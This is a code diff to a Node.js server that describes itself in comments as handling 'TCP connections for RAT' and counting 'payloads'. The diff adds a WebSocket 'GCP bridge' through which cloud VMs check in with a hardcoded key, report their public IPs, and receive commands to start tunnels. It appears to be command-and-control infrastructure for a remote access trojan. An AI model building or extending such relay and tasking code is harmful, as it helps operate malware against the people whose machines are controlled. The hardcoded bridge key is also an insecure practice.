@@ -46,6 +46,9 @@ const pendingTunnels = new Map(); // For pre-registered tunnels
 // TCP connections for RAT
 const tcpClients = new Map();
 
+// ===== ADD THIS FOR GCP BRIDGE =====
+const gcpBridges = new Map();
+
 app.use(cors());
 app.use(express.json());
 
@@ -64,6 +67,7 @@ app.get('/', (req, res) => {
         payloads: payloads.size,
         tcpClients: tcpClients.size,
         pending: pendingTunnels.size,
+        gcpBridges: gcpBridges.size,  // Add this
         timestamp: new Date().toISOString()
     });
 });
@@ -76,6 +80,7 @@ app.get('/api/health', (req, res) => {
         tunnels: tunnels.size,
         pending: pendingTunnels.size,
         tcpClients: tcpClients.size,
+        gcpBridges: gcpBridges.size,  // Add this
         uptime: process.uptime()
     });
 });
@@ -122,12 +127,39 @@ app.get('/api/tunnel/:id', (req, res) => {
     }
 });
 
+// API endpoint to start a tunnel on GCP (add this)
+app.post('/api/tunnel/start', (req, res) => {
+    const { tunnelId, service, port, apiKey } = req.body;
+    
+    if (gcpBridges.size === 0) {
+        return res.status(503).json({ 
+            error: 'No GCP VM available. Please try again later.' 
+        });
+    }
+    
+    // Send command to first available bridge
+    const [bridgeId, bridge] = gcpBridges.entries().next().value;
+    
+    bridge.ws.send(JSON.stringify({
+        type: `start_${service}`,
+        tunnelId: tunnelId,
+        port: port,
+        apiKey: apiKey
+    }));
+    
+    res.json({
+        success: true,
+        message: `Starting ${service} tunnel...`,
+        bridgeId: bridgeId
+    });
+});
+
 // Catch-all for undefined routes
 app.use((req, res) => {
     res.status(404).json({
         status: 'error',
         message: `Route ${req.method} ${req.url} not found`,
-        availableRoutes: ['GET /', 'GET /api/health', 'POST /api/tunnel/register', 'GET /api/tunnel/:id', 'WebSocket /']
+        availableRoutes: ['GET /', 'GET /api/health', 'POST /api/tunnel/register', 'GET /api/tunnel/:id', 'POST /api/tunnel/start', 'WebSocket /']
     });
 });
 
@@ -196,9 +228,53 @@ tcpServer.listen(TCP_PORT, '0.0.0.0', () => {
     console.log(`🔌 TCP Server running on port ${TCP_PORT}`);
 });
 
-// ==================== WEBSOCKET SERVER FOR FLUTTER APP ====================
+// ==================== WEBSOCKET SERVER ====================
 wss.on('connection', (ws, req) => {
     const url = new URL(req.url, `http://${req.headers.host}`);
+    const pathname = url.pathname;
+    
+    // ===== ADD THIS GCP BRIDGE HANDLER FIRST =====
+    if (pathname === '/ws/gcp-bridge') {
+        const apiKey = url.searchParams.get('key');
+        
+        if (apiKey !== 'fly0rakoon-bridge-key-2024') {
+            ws.send(JSON.stringify({ error: 'Invalid API key' }));
+            ws.close();
+            return;
+        }
+        
+        const bridgeId = Math.random().toString(36).substring(2, 10);
+        gcpBridges.set(bridgeId, { ws, connectedAt: new Date() });
+        
+        console.log(`✅ GCP Bridge connected: ${bridgeId}`);
+        
+        ws.on('message', (data) => {
+            try {
+                const msg = JSON.parse(data);
+                console.log(`Bridge ${bridgeId}: ${msg.type}`);
+                
+                if (msg.type === 'register') {
+                    console.log(`GCP VM Registered: ${msg.publicIp} (GoTunnel: ${msg.gotunnel}, Kami: ${msg.kami})`);
+                } else if (msg.type === 'tunnel_ready') {
+                    console.log(`✅ Tunnel Ready: ${msg.tunnelId} -> ${msg.endpoint}`);
+                } else if (msg.type === 'status') {
+                    console.log(`Status: ${msg.activeTunnelsCount} active tunnels`);
+                }
+            } catch(e) {
+                console.error('Bridge message error:', e);
+            }
+        });
+        
+        ws.on('close', () => {
+            console.log(`❌ GCP Bridge disconnected: ${bridgeId}`);
+            gcpBridges.delete(bridgeId);
+        });
+        
+        ws.send(JSON.stringify({ type: 'connected', message: 'GCP Bridge registered' }));
+        return;
+    }
+    
+    // ===== YOUR EXISTING WEBSOCKET CODE CONTINUES BELOW =====
     const type = url.searchParams.get('type');
     const port = url.searchParams.get('port');
     const token = url.searchParams.get('token') || generateToken();
